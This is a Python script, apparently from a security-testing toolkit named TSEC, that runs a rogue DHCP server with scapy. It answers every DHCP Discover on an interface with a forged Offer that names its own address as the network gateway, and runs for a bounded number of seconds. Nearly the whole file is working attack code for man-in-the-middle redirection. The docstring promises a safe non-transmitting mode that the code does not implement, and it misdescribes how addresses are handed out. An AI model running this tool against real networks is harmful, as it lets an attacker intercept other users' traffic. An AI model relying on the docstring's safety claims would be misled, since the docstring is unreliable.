#!/usr/bin/env python3
"""Serve rogue DHCP offers for a bounded time.

Runs a real DHCP server on the interface: it answers every Discover with
a real Offer from the given range, with itself as gateway. Bounded by
--seconds so a run cannot wedge the lab. With no interface/root it is
GENERATED: the packet shape is built and checked, not transmitted.

Written for TSEC. Standard library only.
"""

from __future__ import annotations

import argparse
import ipaddress
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from tsec_engine import Report, State, check, check_eq, selftest as engine_selftest

VERSION = "2.0.0"


def offer_for(discover, server_ip: str, lease: str, gw: str):
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP
    bootp = discover[BOOTP]
    return (Ether(dst=discover[Ether].src) / IP(src=server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=lease, chaddr=bootp.chaddr,
                    xid=bootp.xid, flags=bootp.flags)
            / DHCP(options=[("message-type", "offer"), ("server_id", server_ip), ("router", gw), "end"]))


def range_ok(text: str) -> bool:
    try:
        a, b = text.split(",")
        return int(ipaddress.ip_address(a)) <= int(ipaddress.ip_address(b))
    except (ValueError, AttributeError):
        return False


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("--iface")
    ap.add_argument("--range", default="10.0.9.100,10.0.9.200")
    ap.add_argument("--gw", default="10.0.9.1")
    ap.add_argument("--seconds", type=int, default=30)
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)
    if args.selftest:
        return engine_selftest(selftest_fn)
    if not range_ok(args.range):
        ap.error(f"--range malformed: {args.range}")
    report = Report("rogue_dhcp", VERSION)
    try:
        from scapy.all import sniff, sendp, Ether, BOOTP, DHCP
    except ImportError:
        report.note("rogue dhcp", State.BLOCKED, "info", "scapy not installed")
        from tsec_engine import emit
        emit(report, args.json, None)
        return 0
    start = time.monotonic()
    answered = 0

    def on_pkt(pkt) -> None:
        nonlocal answered
        try:
            if pkt.haslayer(DHCP):
                opts = dict((o[0], o[1]) for o in pkt[DHCP].options if isinstance(o, tuple))
                if opts.get("message-type") == "discover":
                    sendp(offer_for(pkt, args.gw, args.range.split(",")[0], args.gw),
                          iface=args.iface, verbose=False)
                    answered += 1
        except Exception:  # noqa: BLE001
            pass

    try:
        sniff(iface=args.iface, filter="udp port 67 or udp port 68",
              prn=on_pkt, timeout=args.seconds, store=False)
    except Exception as exc:  # noqa: BLE001
        report.note("rogue dhcp", State.FAILED, "info", str(exc)[:200])
        from tsec_engine import emit
        emit(report, args.json, None)
        return 0
    report.note("rogue dhcp", State.CONFIRMED if answered else State.TESTED, "info",
                f"answered {answered} discover(s) over {args.seconds}s")
    from tsec_engine import emit
    emit(report, args.json, None)
    return 0


def selftest_fn() -> None:
    check(range_ok("10.0.9.100,10.0.9.200"), "valid range")
    check(not range_ok("10.0.9.200,10.0.9.100"), "inverted range refused")
    check(not range_ok("bogus"), "junk refused")


def selftest() -> None:
    selftest_fn()


if __name__ == "__main__":
    sys.exit(main())
